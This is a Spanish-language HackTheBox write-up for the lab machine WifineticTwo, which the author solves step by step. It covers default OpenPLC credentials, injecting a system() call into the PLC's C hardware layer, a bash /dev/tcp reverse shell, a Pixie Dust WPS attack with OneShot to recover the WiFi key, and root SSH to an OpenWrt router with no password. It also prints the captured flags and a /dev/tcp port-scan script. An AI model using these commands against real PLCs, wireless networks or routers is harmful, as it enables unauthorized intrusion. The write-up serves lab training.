---
title: "Máquina WifineticTwo"
description: "Resolución de la máquina WifineticTwo de HackTheBox"
tags: ["PLC", "Pixie Dust", "Default credentials"]
categories: ["HackTheBox", "Medium", "Linux"]
logo: "/assets/writeups/wifinetictwo/logo.webp"
---

Hay un software PLC expuesto con credenciales por defecto al cual podemos acceder y tiene una sección para ejecutar programas en C dentro del hardware, la que usaremos para acceder a la máquina. Este "dispositivo" puede ver una red WiFi a la que nos podremos conectar obteniendo su contraseña mediante un ataque Pixie Dust, y finalmente estando dentro de la red podremos acceder como root al router ya que usa las credenciales por defecto.

> Si estuviste esperando este Writeup, no lo publiqué ya que la situación del país en el que vivo actualmente está tensa y estuve concentrado en lo que pasaba alrededor.
{: .prompt-info }

## Reconocimiento

La máquina tiene dos puertos abiertos

```bash
# Nmap 7.94 scan initiated Sat Mar 16 21:35:14 2024 as: nmap -sS -Pn -n -vvv -p- --open -oN ports --min-rate 100 10.129.127.234
Nmap scan report for 10.129.127.234
Host is up, received user-set (0.25s latency).
Scanned at 2024-03-16 21:35:14 -04 for 224s
Not shown: 63084 closed tcp ports (reset), 2449 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Mar 16 21:38:58 2024 -- 1 IP address (1 host up) scanned in 224.26 seconds
```

El puerto 8080 nos pide autenticación:

![Web](/assets/writeups/wifinetictwo/1.png)

Vamos a ver que tiene.

## Intrusión

### root - attica0x

Buscando por internet sobre este software, podemos encontrar que normalmente viene ajustado con un par de credenciales, el cual es `openplc:openplc`; probándolo nos dará acceso al dashboard en cuestión

![Dashboard](/assets/writeups/wifinetictwo/2.png)

Podemos ver que tenemos un par de funciones, incluida una para iniciar el servidor PLC.

> PLC es la abreviación anglosajona para "Programmable Logic Controller", que son básicamente placas programables como la ESP32.
{: .prompt-tip }

Indagando en la documentación de este software, encontraremos que en la parte de "Hardware" podremos editar el código de la capa de Hardware del programa PLC, pudiendo así extender las funcionalidades de este. Nos deja un editor con un código C:

```c
... [snip] ...
int ignored_bool_inputs[] = {-1};
int ignored_bool_outputs[] = {-1};
int ignored_int_inputs[] = {-1};
int ignored_int_outputs[] = {-1};

//-----------------------------------------------------------------------------
// This function is called by the main OpenPLC routine when it is initializing.
// Hardware initialization procedures for your custom layer should be here.
//-----------------------------------------------------------------------------
void initCustomLayer()
{
}

//-----------------------------------------------------------------------------
// This function is called by OpenPLC in a loop. Here the internal input
// buffers must be updated with the values you want. Make sure to use the mutex 
// bufferLock to protect access to the buffers on a threaded environment.
//-----------------------------------------------------------------------------
void updateCustomIn()
{
    // Example Code - Overwritting %IW3 with a fixed value
    // If you want to have %IW3 constantly reading a fixed value (for example, 53)
    // you must add %IW3 to the ignored vectors above, and then just insert this 
    // single line of code in this function:
    //     if (int_input[3] != NULL) *int_input[3] = 53;
}

//-----------------------------------------------------------------------------
// This function is called by OpenPLC in a loop. Here the internal output
// buffers must be updated with the values you want. Make sure to use the mutex 
// bufferLock to protect access to the buffers on a threaded environment.
//-----------------------------------------------------------------------------
void updateCustomOut()
{
    // Example Code - Sending %QW5 value over I2C
    // If you want to have %QW5 output to be sent over I2C instead of the
    // traditional output for your board, all you have to do is, first add
    // %QW5 to the ignored vectors, and then define a send_over_i2c()
    // function for your platform. Finally you can call send_over_i2c() to 
    // send your %QW5 value, like this:
    //     if (int_output[5] != NULL) send_over_i2c(*int_output[5]);
    //
    // Important observation: If your I2C pins are used by OpenPLC I/Os, you
    // must also add those I/Os to the ignored vectors, otherwise OpenPLC
    // will try to control your I2C pins and your I2C message won't work.
}

```

Bien, como podemos intuir el software se va a encargar de compilar este código C y luego ejecutarlo dentro del PLC, algo que se nos puede ocurrir intentar (aunque no sería muy viable intentarlo, dado que existe la posiblidad de que las cabeceras de C existentes solamente sean las de los PLC) es incluir la cabecera `stdlib.h` e intentar ejecutar un comando del sistema con la función `system()`. Podríamos modificar el código así:

```c
#include <stdlib.h>

// Elegimos esta función ya que es la que primero se ejecutará al inicializar el programa. 
void initCustomLayer(){
    system("... command to execute ...");
}


... [snip]
```

Guardando el código y luego ejecutando el PLC hará que efectivamente, el comando que le hayamos puesto se ejecute. Por lo que podemos proceder a enviarnos una reverse shell ejecutando `bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'`:

```bash
❯ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.7 47146
bash: cannot set terminal process group (171): Inappropriate ioctl for device
bash: no job control in this shell
root@attica04:/opt/PLC/OpenPLC_v3/webserver# script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
root@attica04:/opt/PLC/OpenPLC_v3/webserver# ^Z
[1]  + 4559 suspended  nc -lvnp 443

❯ stty raw -echo; fg
[1]  + 4559 continued  nc -lvnp 443
                                   reset xterm
root@attica04:/opt/PLC/OpenPLC_v3/webserver# export TERM=xterm-256color
root@attica04:/opt/PLC/OpenPLC_v3/webserver# source /etc/skel/.bashrc
root@attica04:/opt/PLC/OpenPLC_v3/webserver# stty rows 34 columns 149
```

Estando aquí dentro, ya podremos tomar la primera flag:

```bash
root@attica04:/opt/PLC/OpenPLC_v3/webserver# cd /root
root@attica04:~# ls -la
total 24
drwx------  3 root root 4096 Feb 21 16:56 .
drwxr-xr-x 17 root root 4096 Jul 31 23:07 ..
lrwxrwxrwx  1 root root    9 Feb 21 14:40 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwxr-xr-x  3 root root 4096 Jan  7  2024 .cache
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Aug  1 02:34 user.txt
root@attica04:~# cat user.txt
6de46527c33a645e38587555d5******
```

### root - main router

Viendo las interfaces que tenemos asignadas, hay una llamada `wlan0`, que podemos imaginar que es para conexiones wireless. También podemos ver que estamos en la `10.0.3.5/10.0.3.152` y no en el equipo host:

```bash
root@attica04:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if21: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:43:46:3a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.0.3.5/24 brd 10.0.3.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet 10.0.3.152/24 metric 100 brd 10.0.3.255 scope global secondary dynamic eth0
       valid_lft 2617sec preferred_lft 2617sec
    inet6 fe80::216:3eff:fe43:463a/64 scope link 
       valid_lft forever preferred_lft forever
8: wlan0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:05:00 brd ff:ff:ff:ff:ff:ff
```

Viendo el software instalado, podemos apreciar que tenemos disponibilidad de `wpa_supplicant` e `iw`; usando este último comando para inspeccionar redes WiFi podemos ver una:

```bash
root@attica04:~# iw dev wlan0 scan
sBSS 02:00:00:00:01:00(on wlan0)
        last seen: 13982.068s [boottime]
        TSF: 1722481217510415 usec (19936d, 03:00:17)
        freq: 2412
        beacon interval: 100 TUs
        capability: ESS Privacy ShortSlotTime (0x0411)
        signal: -30.00 dBm
        last seen: 0 ms ago
        Information elements from Probe Response frame:
        SSID: plcrouter
        Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
        DS Parameter set: channel 1
        ERP: Barker_Preamble_Mode
        Extended supported rates: 24.0 36.0 48.0 54.0 
        RSN:    * Version: 1
                * Group cipher: CCMP
                * Pairwise ciphers: CCMP
                * Authentication suites: PSK
                * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
        Supported operating classes:
                * current operating class: 81
        Extended capabilities:
                * Extended Channel Switching
                * SSID List
                * Operating Mode Notification
        WPS:    * Version: 1.0
                * Wi-Fi Protected Setup State: 2 (Configured)
                * Response Type: 3 (AP)
                * UUID: 572cf82f-c957-5653-9b16-b5cfb298abf1
                * Manufacturer:  
                * Model:  
                * Model Number:  
... [snip]
```

Parece que tenemos una red configurada con WPS llamada `plcrouter` disponible para conectarnos, viendo el cifrado ya se puede evidenciar que está protegida por contraseña. Veamos como podemos burlar la protección.

Existe un ataque Wireless llamado Pixie Dust que se aprovecha del hecho de que la seguridad del protocolo WPS en cuanto a la autenticación contiene una vulnerabilidad en la que; si los primeros cuatro digitos del PIN están mal te dirá un error, pero si son los correctos te dirá otro. Herramientas como Reaver se aprovechan de esto para obtener el PIN del WPS completo y de ahí obtener la contraseña del WiFi.

Yo voy a hacer uso de un script Python llamado [OneShot](https://github.com/fulvius31/OneShot), que tiene muy pocas dependencias, lo único que tenemos que instalar para que funcione es [pixiewps](https://github.com/wiire-a/pixiewps/releases/tag/v1.4.2) tal como lo indica el README. Al instalar esta dependencia y subir el oneshot a la máquina ya lo podremos usar:

```bash
root@attica04:/tmp# python3 shot.py
usage: shot.py [-h] -i INTERFACE [-b BSSID] [-s SSID] [-p PIN] [-K] [-F] [-X]
               [-B] [--pbc] [-d DELAY] [-w] [--iface-down]
               [--vuln-list VULN_LIST] [-l] [-r] [--mtk-wifi] [-v]
shot.py: error: the following arguments are required: -i/--interface
```

Si probamos a darle con la lista de pins que tiene por defecto no nos logrará descubrir el PIN, pero viendo que tiene una opción para darle el PIN manualmente, siendo curiosos si le damos combinaciones típicas como `12345678` nos dirá que la primera parte del PIN es válida:

```bash
root@attica04:/tmp# python3 shot.py -i wlan0 -p 12345678 -K -b 02:00:00:00:01:00
[*] Running wpa_supplicant…
[*] Running wpa_supplicant…
[*] Trying PIN '12345678'…
[*] Scanning…
[*] Authenticating…
[+] Authenticated
[*] Associating with AP…
[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
[*] Received Identity Request
[*] Sending Identity Response…
[*] Received WPS Message M1
[P] E-Nonce: 2E1A64EBCD901945E70E6F64A7061D7E
[*] Sending WPS Message M2…
[P] PKR: BCAB7BEEB496E31FC2C23729B97FD42E7AEA90C7B94663CC3F82535C8A67BC02DB47D6D35AB32FECE9DE5571FC4A0DBFB5D231E7E1F9DCBEC40E9773D8DD0C7FB62AE0946FB7D0B3E09293C6ACFDFE37CF2CC412F0459D3F47950BD3F29654F31C0A04916C0C51AE56364197B14BEDA3AFA2C1767CE3412A6F42C50F7BC48862A653925C59BAEB45CCB66E0A434F203F5BC216BF7D51F212CD12657881A082E03C13CFB9D0AE1937873F5E5D465503B8EADD91BA647E37FAB7F7FF12399D564F
[P] PKE: 0CAC4E24A2C035DE3EEC31EA8E030BC4066B4B8DF0A30DECAE8AA5EAB66D24FA62838A85C7B92B84D5AD441B958245D8FE06481EB60DC281B2052B18E09F377DEFD7B6EB8135D730B4CC5346C1E1530D0077B3967F32629314226073CC5749FE1FDAA5A90F00089EC335E5E41B43094A17716BB7B146C1AE9256152AE4D99FAFB41FF75ABDB861222B2F3BB91415EA4743076E7425D7483533F5735DC0333240B96EC0A4ECD1E1AB115DB919A2D68CD0D210BC901DC5E51219AE7E5A8208F0FF
[P] AuthKey: B1864858B4FF560645414543615D12D22F3379C697B711B3114AAE1FA8000EF8
[*] Received WPS Message M3
[P] E-Hash1: 560294C1D26C06BFB005962DD488A9B999E99572E42125A3192892592A2857DA
[P] E-Hash2: 3BAFFE78A53D85A07EC872C34530E3C64A59911589D0900DC0367A8CBC48F3B3
[*] Sending WPS Message M4…
[*] Received WPS Message M5
[+] The first half of the PIN is valid
[*] Sending WPS Message M6…
[*] Running Pixiewps…
... [snip]
```

y bueno, si probamos a cambiar el diccionario a combinaciones que comienzen con `1234` encontraremos que `12345670` es el PIN correcto y con eso, nos descubrirá la contraseña:

```bash
root@attica04:/tmp# python3 shot.py -i wlan0 -p 12345670 -K -b 02:00:00:00:01:00
[*] Running wpa_supplicant…
[*] Running wpa_supplicant…
[*] Trying PIN '12345670'…
[*] Scanning…
[*] Authenticating…
[+] Authenticated
[*] Associating with AP…
[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
[*] Received Identity Request
[*] Sending Identity Response…
[*] Received WPS Message M1
[P] E-Nonce: 9A38317F705D5B3AE1892D4F4EABF521
[*] Sending WPS Message M2…
[P] PKR: BC687EA904BE4E05CDC4EDB5C2C67018197ACD8865AB82209B5202349AF5CB52EBF33B8050B424A83ABC1DBC760A040C70A1E86294A14F3146765CBCA8065FDC747D9186DA021EBDB0B9965A9E9D645EA507A226B61F4202ECB3044F957E81234904FF550E4A02A0501A029A75F0E86EC3183B1D1E8B4618D2C6ECDA00E4EEF1463F3271F5AE7F2AF620EAF1D1C8D6927960E987ECC42507E21CFDA7DCCEC11849E6C5D5216EE1B890C85A8A1BB7B9504244BAC98732F9413186431EAF4C34FA
[P] PKE: F37A3F7A4A9CCF7A01494C9AD7AC2C2135B6E215496E03CD4AC2919611760E58751ACF51836B3A5C6753355AD64325376FC60ED9AD38BF695BA52942663AFE350A990497552A46B10D6474FFE01DFF9D592F01E39BC1AD007041B042CE19729C542956BBEBD4507B2CF5E9A4A273E97506252ACC6493E3A225A6E41A1F2C7B09A758683BC659A1DC855B5AC7CF1C1027B4DF7F213F06BBAA9588702BEEC3B5A734EFABDBB47A642AA9F1DC8DC71F574F1A7BD75D6916A667F1E1E76ABBAD1A0A
[P] AuthKey: F298DFF08106C4F1B1AA6E2413D77F83E18FDC4C2BAB077CE1B1F2352D76FC2B
[*] Received WPS Message M3
[P] E-Hash1: EF4F37F394301CE503B4EEB54434D58A413E25FA4F911D0ACEB171078FF9CB1F
[P] E-Hash2: A3B641AAF3795B5D7F6B7C845DCFAF71B861C051D0BCC7A166D5E309FFA627BD
[*] Sending WPS Message M4…
[*] Received WPS Message M5
[+] The first half of the PIN is valid
[*] Sending WPS Message M6…
[*] Received WPS Message M7
[+] WPS PIN: '12345670'
[+] WPA PSK: 'NoWWEDoKnowWhaTisReal123!'
[+] AP SSID: 'plcrouter'
```

Ahora vamos a conectarnos a esta red para ver que tenemos por ahí; utilizando el wpa_supplicant podemos hacer esto creando un perfil para la red y luego diciéndole al daemon en cuestión que lo utilize:

```bash
root@attica04:/tmp# wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!'
network={
	ssid="plcrouter"
	#psk="NoWWEDoKnowWhaTisReal123!"
	psk=2bafe4e17630ef1834eaa9fa5c4d81fa5ef093c4db5aac5c03f1643fef02d156
}
root@attica04:/tmp# wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!' > test.conf
root@attica04:/tmp# wpa_supplicant -B -i wlan0 -c /tmp/test.conf
Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
```

En un principio no tendremos una dirección IPv4 asignada, pero podemos buscarla simplemente ejecutando el cliente DHCP:

```bash
root@attica04:/tmp# dhclient
RTNETLINK answers: File exists
root@attica04:/tmp# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if20: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:79:d1:d2 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.0.3.4/24 brd 10.0.3.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet 10.0.3.237/24 metric 100 brd 10.0.3.255 scope global secondary dynamic eth0
       valid_lft 3006sec preferred_lft 3006sec
    inet6 fe80::216:3eff:fe79:d1d2/64 scope link 
       valid_lft forever preferred_lft forever
7: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.8/24 brd 192.168.1.255 scope global dynamic wlan0
       valid_lft 43136sec preferred_lft 43136sec
    inet6 fe80::ff:fe00:400/64 scope link 
       valid_lft forever preferred_lft forever
```

Enumerando esta red podemos ver evidentemente, que el gateway está ubicado en `192.168.1.1` y tiene unos cuantos puertos abiertos:

```bash
root@attica04:/tmp# ./scan.sh 192.168.1.1
Port 22 is open on 192.168.1.1
Port 53 is open on 192.168.1.1
Port 80 is open on 192.168.1.1
Port 443 is open on 192.168.1.1
```

Viendo el puerto 80, vemos un título que nos dice cosas:

```bash
root@attica04:/tmp# curl -v http://192.168.1.1
*   Trying 192.168.1.1:80...
* Connected to 192.168.1.1 (192.168.1.1) port 80 (#0)
> GET / HTTP/1.1
> Host: 192.168.1.1
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Connection: Keep-Alive
< Keep-Alive: timeout=20
< ETag: "8155f-30c-65537843"
< Last-Modified: Tue, 14 Nov 2023 13:38:11 GMT
< Date: Sat, 03 Aug 2024 14:40:54 GMT
< Content-Type: text/html
< Content-Length: 780
< 
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
		<meta http-equiv="Pragma" content="no-cache" />
                <meta http-equiv="Expires" content="0" />
		<meta http-equiv="refresh" content="0; URL=cgi-bin/luci/" />
		<style type="text/css">
			body { background: white; font-family: arial, helvetica, sans-serif; }
			a { color: black; }

			@media (prefers-color-scheme: dark) {
				body { background: black; }
				a { color: white; }
			}
		</style>
	</head>
	<body>
		<a href="cgi-bin/luci/">LuCI - Lua Configuration Interface</a>
	</body>
</html>
* Connection #0 to host 192.168.1.1 left intact
```

Esta LuCI es una utilidad para configurar routers que corren el sistema OpenWRT, leyendo la documentación podemos encontrar que la contraseña por defecto de este panel está en blanco y el usuario es `root`, y también por defecto el servidor ssh dropbear acepta autenticaciones del usuario root con su contraseña. Al intentar meternos por ssh con el usuario root sin contraseña para ver si la contraseña en este panel es la misma que la del sistema, podemos ver que si:

```bash
root@attica04:/tmp# ssh root@192.168.1.1
The authenticity of host '192.168.1.1 (192.168.1.1)' cant be established.
ED25519 key fingerprint is SHA256:ZcoOrJ2dytSfHYNwN2vcg6OsZjATPopYMLPVYhczadM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.1' (ED25519) to the list of known hosts.


BusyBox v1.36.1 (2023-11-14 13:38:11 UTC) built-in shell (ash)

  _______                     ________        __
 |       |.-----.-----.-----.|  |  |  |.----.|  |_
 |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
 |_______||   __|_____|__|__||________||__|  |____|
          |__| W I R E L E S S   F R E E D O M
 -----------------------------------------------------
 OpenWrt 23.05.2, r23630-842932a63d
 -----------------------------------------------------
=== WARNING! =====================================
There is no root password defined on this device!
Use the "passwd" command to set up a new password
in order to prevent unauthorized SSH logins.
--------------------------------------------------
root@ap:~# 
```

Ahora simplemente podemos tomar la última flag en cuestión:

```bash
root@ap:~# ls -la
drwxr-xr-x    2 root     root          4096 Jan  7  2024 .
drwxr-xr-x   17 root     root          4096 Aug  3 15:01 ..
-rw-r-----    2 root     root            33 Aug  3 15:07 root.txt
root@ap:~# cat root.txt
ef83ad404bfd54d06dc2adb1fc3ec966
```

## Extra

Este es el script que usé para el escaneo de puertos dentro de la máquina:

```bash
#!/bin/bash

if [ -z "$1" ]; then 
  echo "Please specify an address."
  echo "$0 <ip-address>"
  exit 1 
fi

for x in {1..65535}; do 
  bash -c "echo 1 > /dev/tcp/$1/$x" 2>/dev/null
  if [ $? -eq 0 ]; then
    echo "Port $x is open on $1"
  fi
done
```
{: file="scan.sh"}

Esta es una de esas máquinas en las que no comprometes el host en si, solamente las máquinas virtuales que están siendo expuestas por este; ya que al tomar la última flag dentro del router seguimos estando dentro de

```bash
root@ap:/# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
4: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP qlen 1000
    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.1/24 scope global wlan0
       valid_lft forever preferred_lft forever
    inet6 fe80::ff:fe00:100/64 scope link 
       valid_lft forever preferred_lft forever
```

Por lo que efectivamente, parece que no hay manera acceder a la `10.10.11.7`.





